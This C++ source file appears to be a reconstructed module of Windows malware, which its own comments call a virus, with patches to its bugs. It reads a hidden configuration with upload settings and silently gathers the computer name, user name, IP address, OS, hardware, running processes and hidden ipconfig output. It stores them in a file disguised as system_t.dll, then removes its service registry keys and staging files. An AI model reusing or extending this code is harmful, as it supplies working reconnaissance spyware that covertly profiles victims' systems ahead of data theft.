// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include "setup.hpp"

#include <iostream>
#include <TlHelp32.h>
#include "StdAfx.hpp"
#include "network_info.hpp"

bool LoadConfig()
{
	CHAR szConfigPath[260];
	CHAR szWinDir[260];

	GetWindowsDirectory(szWinDir, 260);
	sprintf(szConfigPath, "%s\\system\\config_t.dat", szWinDir);
	
	GetPrivateProfileString("Option", "WebPage", g_szBlank, g_szWebPage, 256, szConfigPath);
	
	g_nDownCmdTime		= GetPrivateProfileInt("Option", "DownCmdTime", 0, szConfigPath);
	g_nUploadRate		= GetPrivateProfileInt("Option", "UploadRate", 0, szConfigPath);
	g_dwMaxFileSizeKB	= 10240;
	g_bAutoCheck		= GetPrivateProfileInt("OtherTwo", "AutoCheck", 0, szConfigPath) == TRUE;
	g_bCheckedSuccess	= GetPrivateProfileInt("OtherTwo", "CheckedSuccess", 0, szConfigPath) == TRUE;
	
	GetSystemDirectory(g_szSysDir, 260);
	sprintf(g_szStat_T, "%s\\stat_t.ini", g_szSysDir);
	sprintf(g_szDNList, "%s\\dnlist.ini", g_szSysDir);
	sprintf(g_szEnumFS, "%s\\enumfs.ini", g_szSysDir);
	sprintf(g_szUEnumFS, "%s\\uenumfs.ini", g_szSysDir);
	sprintf(g_szUDIdx, "%s\\udidx.ini", g_szSysDir);
	
	GetTempPath(260, g_szTmpPath);
	strcat(g_szTmpPath, "ntvba00.tmp\\");
	
	return strcmp(g_szWebPage, g_szBlank) && g_nDownCmdTime && g_nUploadRate;
}

BOOL RemoveALL()
{
	CHAR szConfigPath[260];
	CHAR szWinDir[260];
	CHAR szServiceName[260];
	CHAR szSubKey[260];

	memset(szServiceName, 0, 260);
	
	GetWindowsDirectory(szWinDir, 260);
	sprintf(szConfigPath, "%s\\system\\config_t.dat", szWinDir);
	
	GetPrivateProfileString("Option", "ServiceName", g_szBlank, szServiceName, 256, szConfigPath);
	
	sprintf(szSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s\\Enum", szServiceName);
	RegDeleteKey(HKEY_LOCAL_MACHINE, szSubKey);
	
	sprintf(szSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", szServiceName);
	RegDeleteKey(HKEY_LOCAL_MACHINE, szSubKey);
	
	sprintf(szSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s\\Security", szServiceName);
	RegDeleteKey(HKEY_LOCAL_MACHINE, szSubKey);
	
	sprintf(szSubKey, "SYSTEM\\CurrentControlSet\\Services\\");
	strcat(szSubKey, szServiceName);
	RegDeleteKey(HKEY_LOCAL_MACHINE, szSubKey);
	
	DeleteFile(g_szEnumFS);
	DeleteFile(g_szDNList);
	DeleteFile(g_szUDIdx);
	DeleteFile(g_szUEnumFS);
	DeleteFile(g_szStat_T);
	
	return TRUE;
}

CHAR g_szPCName[32];
CHAR g_szUserName[32];
CHAR g_szOS[256];
CHAR g_szCPU[256];
CHAR g_szPHMemory[128];
CHAR g_szDiskSpace[128];
CHAR g_szIPAddress[132];

bool GetSystemTechnicalInfo(void)
{
	CHAR szSysDir[260];
	GetSystemDirectory(szSysDir, 260);
	
	CHAR szSystem_T[260];
	sprintf(szSystem_T, "%s\\system_t.dll", szSysDir);
	
	// ------------------------- COMPUTER NAME -------------------------
	DWORD nSize = 256;
	CHAR szPCName[256] = {};
	if (!GetComputerName(szPCName, &nSize))
		return false;
	
	g_szPCName[0] = 0;
	szPCName[nSize] = 0;
	
	strcat(g_szPCName, "computer: ");
	strcat(g_szPCName, szPCName);
	
	CHAR szLog[2048] = {};
	sprintf(szLog, "[computerinfo]\r\n");
	strcat(szLog, g_szPCName);
	strcat(szLog, "\r\n");
	
	// ------------------------- USER NAME -------------------------
	DWORD pcbBuffer = 256;
	CHAR szUserName[256] = {};
	if (!GetUserName(szUserName, &pcbBuffer))
		return false;
	
	g_szUserName[0] = 0;
	szUserName[pcbBuffer] = 0;
	
	strcat(g_szUserName, "username: ");
	strcat(g_szUserName, szUserName);
	strcat(szLog, g_szUserName);
	strcat(szLog, "\r\n");
	
	// ------------------------- HOST INFO -------------------------
	CHAR szIPAddr[128] = {};
	CHAR szHostName[256] = {};
	if (!GetHostInfo(szHostName, 256, szIPAddr))
		return false;
	
	//char v15 = 0; // 1 - 4 bytes size
	g_szIPAddress[0] = 0;
	strcat(g_szIPAddress, "IPAddress: ");
	strcat(g_szIPAddress, szIPAddr);
	strcat(szLog, g_szIPAddress);
	strcat(szLog, "\r\n");
	
	// ------------------------- OS INFO -------------------------
	g_szOS[0] = 0;
	strcat(g_szOS, "OS: ");
	
	OSVERSIONINFO osInfo = {};
	osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if(!GetVersionEx(&osInfo))
		return false;
	
	if (osInfo.dwPlatformId == 1)
	{
		if (osInfo.dwMajorVersion == 4)
		{
			if (osInfo.dwMinorVersion == 0)
			{
				strcat(g_szOS, "Microsoft Windows 95 ");
				
				if (osInfo.szCSDVersion[1] == 'C' || osInfo.szCSDVersion[1] == 'B')
					strcat(g_szOS, "OSR2 ");
			}
			else if (osInfo.dwMinorVersion == 10)
			{
				strcat(g_szOS, "Microsoft Windows 98 ");
				
				if (osInfo.szCSDVersion[1] == 'A')
					strcat(g_szOS, "SE ");
			}
			else if (osInfo.dwMinorVersion == 90)
			{
				strcat(g_szOS, "Microsoft Windows Millennium Edition ");
			}
		}
	}
	else if(osInfo.dwPlatformId == 2)
	{
		if (osInfo.dwMajorVersion <= 4)
		{
			strcat(g_szOS, "Microsoft Windows NT ");
		}
		else if (osInfo.dwMajorVersion == 5)
		{
			if (osInfo.dwMinorVersion == 0)
				strcat(g_szOS, "Microsoft Windows 2000 ");
			else if (osInfo.dwMinorVersion == 1)
				strcat(g_szOS, "Microsoft Windows XP ");
			else if (osInfo.dwMinorVersion == 2)
				strcat(g_szOS, "Microsoft Windows 2003 ");
		}
		else if (osInfo.dwMajorVersion == 6)
		{
			if (osInfo.dwMinorVersion == 0)
				strcat(g_szOS, "Microsoft Windows Vista ");
			else if (osInfo.dwMinorVersion == 1)
				strcat(g_szOS, "Microsoft Windows7 ");
			else if (osInfo.dwMinorVersion == 2)
				strcat(g_szOS, "Microsoft Windows8 ");
		}
		
		CHAR szProductType[80];
		DWORD cbData;
		HKEY hKey;
		
		RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\ProductOptions", 0, 1, &hKey);
		RegQueryValueEx(hKey, "ProductType", 0, 0, (LPBYTE)szProductType, &cbData); // CHECK THIS, cbData should be 80
		RegCloseKey(hKey);
		
		if (!lstrcmpi("WINNT", szProductType))
			strcat(g_szOS, "Professional, ");
		
		if (!lstrcmpi("LANMANNT", szProductType))
			strcat(g_szOS, "Server, ");
		
		if (!lstrcmpi("SERVERNT", szProductType))
			strcat(g_szOS, "Advanced Server, ");
		
		CHAR szBuild[256];
		if (osInfo.dwMajorVersion > 4)
		{
			sprintf(szBuild, "%s (Build %d)\n", osInfo.szCSDVersion, (WORD)osInfo.dwBuildNumber);
			strcat(g_szOS, szBuild);
		}
		else
		{
			sprintf(szBuild,
				"version %d.%d %s (Build %d)\n",
				osInfo.dwMajorVersion,
				osInfo.dwMinorVersion,
				osInfo.szCSDVersion,
				(WORD)osInfo.dwBuildNumber
			);
			
			strcat(g_szOS, szBuild);
		}
	}
	
	strcat(szLog, g_szOS);
	strcat(szLog, "\r\n");
	
	// ------------------------- DISK SPACE -------------------------
	g_szDiskSpace[0] = 0;
	strcat(g_szDiskSpace, "Disk Space: ");
	
	unsigned long long v36 = 0;
	unsigned long long v34 = 0;
	
	DWORD cbData = GetLogicalDrives();
	if (0 == cbData)
		return false;

	ULARGE_INTEGER FreeBytesAvailableToCaller;
	ULARGE_INTEGER TotalNumberOfBytes;
	ULARGE_INTEGER TotalNumberOfFreeBytes;
	
	for (char i = 0; i < 26; i++)
	{
		if (!(cbData >> i))
			break;
		
		if ((cbData >> i) & 1)
		{
			char szDrive[4];

			szDrive[1] = ':';
			szDrive[2] = '\\';
			szDrive[0] = i + 'A';
			szDrive[3] = 0;

			if (GetDriveType(szDrive) == DRIVE_FIXED)
			{
#ifndef NO_PATCH
				if (FALSE == GetDiskFreeSpaceEx(szDrive, &FreeBytesAvailableToCaller, &TotalNumberOfBytes, &TotalNumberOfFreeBytes))
					continue;
#else // NO_PATCH
				if (FALSE == GetDiskFreeSpaceEx(szDrive, &FreeBytesAvailableToCaller, &TotalNumberOfBytes, &TotalNumberOfFreeBytes))
					return false; // If one or more disks are inaccessible we should just skip them
#endif // NO_PATCH
				
				v36 += *(unsigned long long *)&TotalNumberOfBytes;
				v34 += *(unsigned long long *)&TotalNumberOfFreeBytes;
			}
		}
	}
	
	v34 /= 0x40000000;
	v36 /= 0x40000000;
	
	CHAR szTotalSpace[64];
	CHAR szLeftSpace[64];
	CHAR szFor[64];
	
	sprintf(szTotalSpace, "total space:%lldGB,", v36);
	sprintf(szLeftSpace, "left space%lldGB", v34);
	sprintf(szFor, "(for%.2f%c)", (double)v34 / (double)v36 * 100.0, '%');
	
	strcat(g_szDiskSpace, szTotalSpace);
	strcat(g_szDiskSpace, szLeftSpace);
	strcat(g_szDiskSpace, szFor);
	
	strcat(szLog, g_szDiskSpace);
	strcat(szLog, "\r\n");
	
	// ------------------------- CPU INFO -------------------------
	g_szCPU[0] = 0;
	strcat(g_szCPU, "CPU: ");
	
	HKEY phkResult;
	CHAR szValue[80];
	DWORD dwKeySize = 80;
	
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, 1u, &phkResult);
	RegQueryValueEx(phkResult, "VendorIdentifier", 0, 0, (LPBYTE)szValue, &dwKeySize);
	
	szValue[dwKeySize] = 0;
	
	strcat(g_szCPU, szValue);
	strcat(g_szCPU, " ");
	
	memset(szValue, 0, 80);
	
	dwKeySize = 80;
	RegQueryValueEx(phkResult, "Identifier", 0, 0, (LPBYTE)szValue, &dwKeySize);
	
	szValue[dwKeySize] = 0;
	
	strcat(g_szCPU, szValue);
	
	int nMHz;
	dwKeySize = 8;
	RegQueryValueEx(phkResult, "~MHz", 0, 0, (LPBYTE)&nMHz, &dwKeySize);
	
	CHAR szMHz[12];
	sprintf(szMHz, " %dMHZ", nMHz);
	strcat(g_szCPU, szMHz);
	
	RegCloseKey(phkResult);
	
	strcat(szLog, g_szCPU);
	strcat(szLog, "\r\n");
	
	// ------------------------- MEMORY INFO -------------------------
	MEMORYSTATUS memStatus;
	GlobalMemoryStatus(&memStatus);
	
	//v36 = memStatus.dwTotalPhys;
	double v0 = (double)memStatus.dwAvailPhys / (double)memStatus.dwTotalPhys * 100.0;
	
	CHAR szPHMemory[256];
	sprintf(szPHMemory,
		"PHMemory: Total Memory:%dMB,Empty Memory:%dMB (for%.2f%s)",
		memStatus.dwTotalPhys >> 20,
		memStatus.dwAvailPhys >> 20,
		v0, // To check this part
		"%" // Noobs, it's enough to use %% for the percentage symbol
	);
	
	g_szPHMemory[0] = 0;
	strcpy(g_szPHMemory, szPHMemory);
	
	strcat(szLog, g_szPHMemory);
	strcat(szLog, "\r\n");
	
	FILE *f = fopen(szSystem_T, "wb");
	if (NULL == f)
		return false;
	
	fwrite(szLog, 1, strlen(szLog), f);
	fclose(f);
	
	return true;
}

BOOL GetProcessList()
{
	CHAR szSysDir[MAX_PATH];
	GetSystemDirectory(szSysDir, MAX_PATH);

	CHAR szSystem_T[MAX_PATH];
	sprintf(szSystem_T, "%s\\system_t.dll", szSysDir);

	__tfnCreateToolhelp32Snapshot lpfnCreateToolhelp32Snapshot = (__tfnCreateToolhelp32Snapshot)GetProcAddress(
		LoadLibrary("kernel32.dll"),
		"CreateToolhelp32Snapshot"
	);
	
	HANDLE hSnapshot = lpfnCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (NULL == hSnapshot)
		return FALSE;
	
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	
	char szLog[260];
	sprintf(szLog, "\r\n[Processlist]\r\n");
	
	FILE *f1 = fopen(szSystem_T, "ab");
	if (NULL == f1)
		return FALSE;
	
	fwrite(szLog, 1, strlen(szLog), f1);
	fclose(f1);
	
	for (BOOL i = Process32First(hSnapshot, &pe); i; i = Process32Next(hSnapshot, &pe))
	{
		memset(szLog, 0, 260);
		sprintf(szLog, "%4d %s\r\n", pe.th32ProcessID, pe.szExeFile);
		
		FILE *f = fopen(szSystem_T, "ab");
		if (NULL == f)
			return FALSE;
		
		fwrite(szLog, 1, strlen(szLog), f);
		fclose(f);
	}
	
	CloseHandle(hSnapshot);
	return TRUE;
}

void GetNetworkInfo()
{
	CHAR szCMDLine[] = "ipconfig /all";
	
	CHAR szSysDir[MAX_PATH];
	GetSystemDirectory(szSysDir, MAX_PATH);
	
	CHAR szFileSystem_T[MAX_PATH];
	sprintf(szFileSystem_T, "%s\\system_t.dll", szSysDir);
	
	SECURITY_ATTRIBUTES PipeAttributes;
	PipeAttributes.nLength				= sizeof(SECURITY_ATTRIBUTES);
	PipeAttributes.lpSecurityDescriptor	= NULL;
	PipeAttributes.bInheritHandle		= TRUE;
	
	HANDLE hObject;
	HANDLE hFile;
	if (FALSE == CreatePipe(&hFile, &hObject, &PipeAttributes, 0))
		return;
	
	STARTUPINFO StartupInfo;
		
	StartupInfo.cb			= sizeof(STARTUPINFO);
	GetStartupInfo(&StartupInfo);
		
	StartupInfo.wShowWindow	= 0;
	StartupInfo.hStdError	= hObject;
	StartupInfo.hStdOutput	= hObject;
	StartupInfo.dwFlags		= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		
	PROCESS_INFORMATION ProcessInformation;
	if (TRUE == CreateProcess(NULL, szCMDLine, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInformation))
	{
#ifndef NO_PATCH
		WaitForSingleObject(ProcessInformation.hProcess, 10000);
#else // NO_PATCH
		// If output of ipconfig > 4000 bytes the virus enter in an infinite loop
		WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
#endif // NO_PATCH
		CloseHandle(hObject);
			
		DWORD NumberOfBytesRead = 0;
		char szData[0x2800] = {};
		if (ReadFile(hFile, szData, 0x2800, &NumberOfBytesRead, 0))
		{
			HANDLE hFileLog = CreateFile(szFileSystem_T, GENERIC_WRITE, 3, NULL, 4, FILE_ATTRIBUTE_NORMAL, NULL);
			SetFilePointer(hFileLog, 0, NULL, 2);
				
			DWORD NumberOfBytesWritten = 0;
			WriteFile(hFileLog, "\r\n\r\n", 5, &NumberOfBytesWritten, 0);
				
			NumberOfBytesWritten = 0;
			WriteFile(hFileLog, szData, 0x2800, &NumberOfBytesWritten, 0);
				
			CloseHandle(hFileLog);
		}
			
#ifdef NO_PATCH
		CloseHandle(hObject); // File handle has been already closed
#endif // NO_PATCH
		CloseHandle(ProcessInformation.hProcess);
		CloseHandle(ProcessInformation.hThread);
		CloseHandle(hFile);
	}
}

void WriteLog(LPCVOID lpBuffer, DWORD dwSize)
{
	HANDLE hFile = CreateFile(g_szModuleLogName,
		GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	
	SetFilePointer(hFile, 0, NULL, FILE_END);
	
	DWORD dwWritten = 0;
	WriteFile(hFile, lpBuffer, dwSize, &dwWritten, NULL);
	
	CloseHandle(hFile);
}

void GetProgramFilesEx(const char *lpszProgramFiles)
{
	char szProgramFilesList[260];
	sprintf(szProgramFilesList, "%s*.*", lpszProgramFiles);
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFindFile = FindFirstFile(szProgramFilesList, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFindFile)
		return;
	
	do
	{
		if (_stricmp(FindFileData.cFileName, ".") && _stricmp(FindFileData.cFileName, ".."))
		{
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				LOG(FindFileData.cFileName);
				LOG("\\\r\n");
			}
			else
			{
				LOG(FindFileData.cFileName);
				LOG("\r\n");
			}
		}
	}
	while (FindNextFile(hFindFile, &FindFileData));
	
	FindClose(hFindFile);
}

void Setup_()
{
	CHAR szModuleName[260] = {};
	GetModuleFileName(NULL, szModuleName, 260);
	
	strcpy(g_szModuleLogName, szModuleName);
	strcpy(strrchr(g_szModuleLogName, '.'), ".log");
	
	sprintf(g_szTestURL, "%s", "http://www.microsoft.com/info/privacy_security.htm");
}